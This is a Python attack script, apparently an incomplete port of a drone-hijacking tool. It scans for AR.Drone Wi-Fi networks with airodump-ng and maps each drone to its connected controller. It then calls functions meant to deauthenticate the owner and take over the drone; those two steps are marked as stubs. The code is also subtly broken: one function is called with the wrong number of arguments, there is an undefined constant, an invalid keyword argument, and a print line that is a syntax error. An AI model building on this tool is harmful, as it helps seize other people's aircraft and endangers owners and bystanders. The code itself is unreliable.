# Deuathenticates a drone connection and takes control of the drone.

import sys
import subprocess
import time
import glob
import signal
import os
import re

TMPFILE = "/tmp/skyjack"
AIRODUMP = "airodump-ng"
AIREPLAY = "aireplay-ng"
AIRMON = "airmon-ng"
IFCONFIG = "ifconfig"

targets = []
skyjacked = []
interface = 'wlan2'

# Helper functions

def get_drones():
    """
    Retrieves list of available drones from the other modules.
    STUB. TO BE IMPLEMENTED.
    """

    return targets

def sudo_exec(cmd):
    """
    Executes a command with sudo privileges. Raises errors on failures.
    """

    cmd_list = [str(arg) for arg in cmd]
    print(f"Running: {' '.join(['sudo'] + cmd_list)}")

    try:
        # Runs sudo command and captures output
        subprocess.run(
            ['sudo'] + cmd_list,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
    except subprocess.CalledProcessError as e:
        # Error handling
        print(f"Error executing command: {' '.join(e.cmd)}")
        print(f"Stdout: {e.stdout}")
        print(f"Stderr: {e.stderr}")

def airodump(interface):
    """
    Runs airodump-ng for a short period and terminates it after.
    """

    csv_file_prefix = f"{TMPFILE}"

    # airodump-ng is run in a separate process
    # Output is piped to /dev/null to suppress it

    cmd = ['sudo', airodump, '--output-format', 'csv', '-w', csv_file_prefix, interface]
    print(f"Starting airodump-ng: {' '.join(cmd)}")

    proc = None
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid,
        )
        print(f"airodump-ng PID: {proc.pid}")

        # Let it run for a short period to gather data
        time.sleep(5)

        # Try to terminate process gracefully
        # 1. SIGINT (Ctrl+C)
        try:
            os.kill(proc.pid, signal.SIGINT)
        except ProcessLookupError:
            # Already terminated
            pass

        time.sleep(1)

        # 2. SIGHUP
        try:
            os.kill(proc.pid, signal.SIGHUP)
        except ProcessLookupError:
            # Already terminated
            pass

        time.sleep(1)

        # 3. SIGKILL
        if proc.poll() is None:
            print("Forcefully terminating airodump-ng")
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except ProcessLookupError:
                # Already terminated
                pass
    
    except FileNotFoundError:
        print(f"Could not find {AIRODUMP}. Make sure it is installed and in your PATH.")
        if proc and proc.poll() is None:
            proc.kill()
        return
    
    # Wait for process to actually terminate
    if proc:
        proc.wait(timeout=2)

def parse_airodump_csv(file_path, drone_macs=targets):
    """
    Parses one airodump-ng CSV file to find drone APs and connected clients.

    Returns:
        tuple (clients, chans)
        clients: {client_mac: drone_mac}
        chans: {drone_mac: [channel, essid]}
    """

    clients = {}
    chans = {}

    try:
        with open(file_path, 'r', encodings='utf-8') as f:
            content = f.read()
    except IOError as e:
        print(f"Error reading file {file_path}: {e}")
        return clients, chans
    
    # Split file in BSSID and CLIENT sections
    sections = content.split('\n\n')

    if len(sections) >= 2:
        bssid_section = sections[0].strip()
        client_section = sections[1].strip()
    
    # Finding drone APs
    # We are looking for BSSID (drone_mac), Channel, ESSID
    for line in bssid_section.split('\n'):
        # Skipping headers and empty lines
        if not line or line.startswith('BSSID') or 'Station MAC' in line:
            continue

        fields = [f.strip() for f in line.split(',')]
        if len(fields) >= 16:
            bssid = fields[0]
            channel = fields[3]
            essid = fields[13] # ESSID can vary, airodump-ng is typically 13 for non-GPS output

            # Check if the MAC address matches a drone MAC prefix
            for dev_prefix in drone_macs:
                if bssid.startswith(dev_prefix):
                    if re.match(f"ardone\S+", essid, re.IGNORECASE):
                        print(f"CHANNEL {bssid} {channel} {essid}")
                        chans[bssid] = [channel, essid]
                        # Drone found, move to next line
                        break
    
    # Finding Clients
    # We are looking for Station MAC (client_mac) and BSSID (drone_mac)
    for line in client_section.split('\n'):
        # Skipping headers and empty lines
        if not line or line.startswith('Station MAC'):
            continue
        
        fields = [f.strip() for f in line.split(',')]
        if len(fields) >= 6:
            client_mac  = fields[0]
            bssid = fields[5]

            for dev_prefix in drone_macs:
                if bssid.startswith(dev_prefix):
                    print(f"CLIENT {client_mac} {bssid}")
                    clients[client_mac] = bssid
                    # Client found, move to next line
                    break
    
    return clients, chans

def deauth_drone(clients, channels):
    """
    Deauthenticates a drone client from its AP.
    STUB. TO BE IMPLEMENTED.
    """

    for cli in clients:
        drone_mac = clients[cli]

        if drone_mac not in channels:
            print(f"Skipping deauth for {cli}, no channel info.")

        drone_channel = channels[drone_mac][0]
        drone_essid = channels[drone_mac][1]
        print(f"Found client ({cli}) connected to {drone_essid} ({drone_mac}, channel {drone_channel})")

        print(f"Jumping onto drone's channel {drone_channel}\n")
        sudo_exec(IWCONFIG, interface, 'channel', drone_channel)

        # ...
        
    print("Deauthenticating drone client... (STUB)")
    return

def skyjack_drone(clients, channels):
    """
    Takes control of a drone by connecting to its AP.
    STUB. TO BE IMPLEMENTED.
    """

    print("Skyjacking drone... (STUB)")
    return

# __main__ block

def main_loop():
    """
    Main execution loop for drone attack.
    """

    global skyjacked

    # 1. Put device in monitor mode

    sudo_exec(IFCONFIG, interface, 'down')
    sudo_exec(AIRMON, 'start', interface)

    while True:
        # Run airodump-ng to gather data
        airodump(interface)

        time.sleep(5)

        # Initialize data structures
        current_clients = {}
        current_chans = {}

        # Read in APs from CSV files
        for tmpfile in glob.glob(f"{TMPFILE}*.csv"):
            clients, chans = parse_airodump_csv(tmpfile, targets)
            current_clients.update(clients)
            current_chans.update(chans)

            # Clean up temporary file
            try:
                os.remove(tmpfile)
            except OSError as e:
                print(f"Error removing temporary file {tmpfile}: {e}")

        print("\n\n + "-" * 30")

        # 2. Deauthenticate true owners of the drone

        deauth_drone(current_clients, current_chans)

        # 3. Take control of the drone

        skyjack_drone(current_clients, current_chans)